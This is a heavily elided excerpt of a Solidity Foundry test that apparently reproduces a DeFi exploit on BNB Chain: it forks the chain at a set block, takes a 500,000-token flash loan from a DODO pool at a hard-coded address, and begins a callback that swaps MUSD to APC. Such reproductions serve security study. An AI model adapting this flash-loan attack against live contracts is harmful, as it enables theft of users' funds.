...
contract ContractTest is Test {
    ...
    TransparentUpgradeableProxy transSwap =
        TransparentUpgradeableProxy(0x5a88114F02bfFb04a9A13a776f592547B3080237);
    address dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;

    function setUp() public {
        vm.createSelectFork("bsc", 23_527_906);
    }
    ...
    function testExploit() public {
        ...
        IDVM(dodo).flashLoan(0, 500_000 * 1e18, address(this), new bytes(1));
    ...
    function DPPFlashLoanCall(
        ...
        ); // MUSD swap to APC with normal price
